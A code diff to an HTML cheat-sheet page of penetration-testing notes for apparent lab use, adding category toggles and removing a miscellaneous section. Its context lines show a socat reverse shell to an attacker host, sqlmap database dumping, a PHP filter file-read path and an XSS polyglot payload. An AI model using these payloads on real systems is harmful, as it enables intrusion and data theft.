@@ -40,7 +40,6 @@
                     <li><a href="#exploitation">Exploitation</a></li>
                     <li><a href="#priv-esc">Privilege Escalation</a></li>
                     <li><a href="#web-vulns">Web Vulnerabilities</a></li>
-                    <li><a href="#miscellaneous">Miscellaneous</a></li>
                 </ul>
             </nav>
         </aside>
@@ -48,20 +47,28 @@
         <!-- Main Content Area -->
         <main class="notes-content">
 
+            <!-- Category Toggle Bar (iOS Segmented Control) -->
+            <div class="category-toggle-container">
+                <button class="cat-toggle-btn active" data-category="all" onclick="setCategory('all')">All</button>
+                <button class="cat-toggle-btn" data-category="it" onclick="setCategory('it')">IT</button>
+                <button class="cat-toggle-btn" data-category="defensive" onclick="setCategory('defensive')">Defensive</button>
+                <button class="cat-toggle-btn" data-category="offensive" onclick="setCategory('offensive')">Offensive</button>
+            </div>
+
             <!-- Basic Commands -->
-            <section id="basic-commands" class="content-section">
+            <section id="basic-commands" class="content-section cat-it">
                 <h2>Basic Commands &amp; Protocols</h2>
                 
                 <h3>File Operations &amp; Search</h3>
                 <p>Common commands for finding files and interacting with the system environment.</p>
                 <pre><code># Find file inside a directory, ignoring errors
-find ~ -name "flag.txt" 2&gt;/dev/null
+find / -name "&lt;filename&gt;" 2&gt;/dev/null
 
 # Find files belonging to a specific user
 find / -user &lt;username&gt; 2&gt;/dev/null
 
 # Locate files using built-in search
-search -f flag.txt</code></pre>
+search -f &lt;filename&gt;</code></pre>
 
                 <h3>SSH, Telnet &amp; FTP</h3>
                 <pre><code># Standard SSH Connection
@@ -113,7 +120,7 @@ systemctl status &lt;service-name&gt;</code></pre>
             </section>
 
             <!-- Pivoting & Protocols -->
-            <section id="pivoting-protocols" class="content-section">
+            <section id="pivoting-protocols" class="content-section cat-it">
                 <h2>Pivoting on Servers</h2>
                 
                 <h3>POP3 Protocol</h3>
@@ -143,7 +150,7 @@ Host: &lt;target_host&gt;</code></pre>
             </section>
 
             <!-- Common Tools -->
-            <section id="common-tools" class="content-section">
+            <section id="common-tools" class="content-section cat-defensive">
                 <h2>Common Analysis &amp; Forensics Tools</h2>
                 
                 <h3>Audio Forensics</h3>
@@ -180,7 +187,7 @@ pdfinfo &lt;file&gt;
             </section>
 
             <!-- Enumeration -->
-            <section id="enumeration" class="content-section">
+            <section id="enumeration" class="content-section cat-offensive">
                 <h2>Service Enumeration</h2>
                 
                 <h3>NMAP</h3>
@@ -225,7 +232,7 @@ smbmap -H &lt;IP-adr&gt;</code></pre>
             </section>
 
             <!-- Cracking -->
-            <section id="cracking" class="content-section">
+            <section id="cracking" class="content-section cat-offensive">
                 <h2>Password Cracking</h2>
                 
                 <h3>Hash Identification</h3>
@@ -260,7 +267,7 @@ john --wordlist=rockyou.txt hash.txt</code></pre>
             </section>
 
             <!-- Shells & Payloads -->
-            <section id="shells" class="content-section">
+            <section id="shells" class="content-section cat-offensive">
                 <h2>Bind &amp; Reverse Shells</h2>
                 
                 <h3>Python Reverse Shell Payload</h3>
@@ -293,7 +300,7 @@ socat OPENSSL:&lt;LHOST&gt;:&lt;LPORT&gt;,verify=0 EXEC:/bin/bash</code></pre>
             </section>
 
             <!-- Exploitation -->
-            <section id="exploitation" class="content-section">
+            <section id="exploitation" class="content-section cat-offensive">
                 <h2>Exploitation Frameworks</h2>
                 
                 <h3>Metasploit Console</h3>
@@ -320,7 +327,7 @@ sqlmap -u "http://target.thm/search?cat=1" -D &lt;db_name&gt; -T &lt;table_name&
             </section>
 
             <!-- Privilege Escalation -->
-            <section id="priv-esc" class="content-section">
+            <section id="priv-esc" class="content-section cat-offensive">
                 <h2>Privilege Escalation</h2>
                 
                 <h3>Sudo Rights &amp; SUID</h3>
@@ -351,7 +358,7 @@ export PATH=$PWD:$PATH</code></pre>
             </section>
 
             <!-- Web Vulnerabilities -->
-            <section id="web-vulns" class="content-section">
+            <section id="web-vulns" class="content-section cat-offensive">
                 <h2>Web Application Vulnerabilities</h2>
                 
                 <h3>Insecure Direct Object Reference (IDOR)</h3>
@@ -373,24 +380,6 @@ http://target.thm/test.php?view=php://filter/read=convert.base64-encode/resource
                 </ul>
                 <p><strong>XSS Polyglot bypass example:</strong></p>
                 <pre><code>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\x3e</code></pre>
-            </section>
-
-            <!-- Miscellaneous -->
-            <section id="miscellaneous" class="content-section">
-                <h2>Miscellaneous</h2>
-                
-                <h3>Common CVSS/VPR Metrics</h3>
-                <ul>
-                    <li><strong>CVSS (Common Vulnerability Scoring System):</strong> Evaluates score severity static across Exploitability, Impact, and CIA Triad elements.</li>
-                    <li><strong>VPR (Vulnerability Priority Rating):</strong> Dynamic score assessing current threat landscape and likelihood of live exploitation.</li>
-                </ul>
-
-                <h3>Specialized Pentesting Distributions</h3>
-                <ul>
-                    <li><strong>Kali Linux:</strong> Platform constructed natively for general penetration testing.</li>
-                    <li><strong>REMnux:</strong> Target VM customized specifically for malware analysis and digital forensics.</li>
-                    <li><strong>FLARE VM:</strong> Windows-based operating system designed for reverse engineering.</li>
-                </ul>
             </section>
 
             <footer class="site-footer">
